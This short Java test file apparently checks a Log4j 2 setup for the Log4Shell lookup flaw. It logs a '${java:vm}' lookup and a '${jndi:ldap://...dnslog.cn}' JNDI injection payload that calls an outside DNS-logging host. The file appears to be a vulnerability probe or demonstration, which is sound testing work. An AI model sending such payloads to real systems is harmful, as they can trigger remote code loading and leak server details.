package com.atguigu.mybatis_plus;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
class LogTest {
    public static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("${java:vm}");
        logger.error("${jndi:ldap://ty4ea3.dnslog.cn}");
        String error = "${java:vm}";
        logger.error("==============危险打印，{}", error);
    }
}